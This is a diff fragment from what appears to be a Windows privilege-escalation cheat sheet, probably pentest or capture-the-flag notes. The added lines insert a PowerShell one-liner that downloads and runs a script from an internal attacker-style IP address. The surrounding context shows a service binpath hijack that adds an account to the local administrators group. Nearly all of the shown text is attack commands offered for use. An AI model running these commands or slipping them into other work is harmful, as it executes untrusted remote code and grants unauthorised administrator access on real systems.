@@ -914,6 +914,9 @@ Get-ScheduledTask
 wget https://raw.githubusercontent.com/markwragg/PowerShell-Watch/master/Watch/Public/Watch-Command.ps1
 Get-Process -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 20
 
+#checkcmdline
+IEX (iwr 'http://10.10.10.205/check_cmdline.ps1') 
+
 # Services
 # === Modifiable Services ===
 sc config WindscribeService binpath="cmd /c net localgroup administrators my /add"
